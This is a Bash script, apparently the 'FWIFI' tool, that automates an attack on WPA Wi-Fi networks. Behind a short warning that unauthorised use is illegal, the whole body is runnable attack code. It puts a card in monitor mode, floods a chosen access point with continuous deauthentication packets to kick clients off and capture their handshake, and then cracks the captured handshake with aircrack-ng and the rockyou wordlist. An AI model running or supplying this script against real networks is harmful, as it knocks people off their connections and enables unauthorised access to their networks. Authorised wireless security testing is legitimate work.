#!/bin/bash
#---------------------------------------------------------------------------------------------------------------------------
#
# Name : FWIFI
# Description : FWIFI is a Bash script designed to perform a series of penetration tests on Wi-Fi networks.
# Author: rofidoang03
#
#---------------------------------------------------------------------------------------------------------------------------
#
# Github: https://github.com/rofidoang03/FWIFI
#
#---------------------------------------------------------------------------------------------------------------------------
#
# - WARNING -
#
# Using this script on networks you do not own without permission is illegal.
# Make sure you have permission from the network owner before conducting penetration tests.
# Misuse of this tool may violate the law and the privacy of others.
# Users are fully responsible for the actions taken using this script.
#
#---------------------------------------------------------------------------------------------------------------------------

# Function to sanitize user inputs
sanitize_input() {
    # Remove leading and trailing whitespaces
    local input="$1"
    input=$(echo "$input" | xargs)
    echo "$input"
}

# Prompt for wireless interface name
read -p "Enter the wireless interface name: " interface
interface=$(sanitize_input "$interface")

# Check for and kill processes that might interfere
airmon-ng check kill

# Start monitor mode on the specified interface
airmon-ng start "$interface"

# Display available networks
airodump-ng "$interface"

# Prompt for target BSSID and channel number
read -p "Enter the BSSID of the target network: " bssid
read -p "Enter the Channel number: " channel
bssid=$(sanitize_input "$bssid")
channel=$(sanitize_input "$channel")

# Set the channel for the interface
iwconfig "$interface" channel "$channel"

# Create output directory and filename based on timestamp
timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
output_dir="pcap_files"
mkdir -p "$output_dir"
output_file="${output_dir}/${bssid}_${timestamp}"

crack_handshake() {
    pkill -TERM -P $$

    # Wait for capture file to be generated
    pcap_file="${output_file}-01.cap"
    wait

    # Run aircrack-ng on the captured file using rockyou wordlist
    aircrack-ng -w "wordlists/rockyou.txt" "$pcap_file"

    exit 0
}

trap crack_handshake SIGINT

# Launch attacks in separate xterm windows
xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
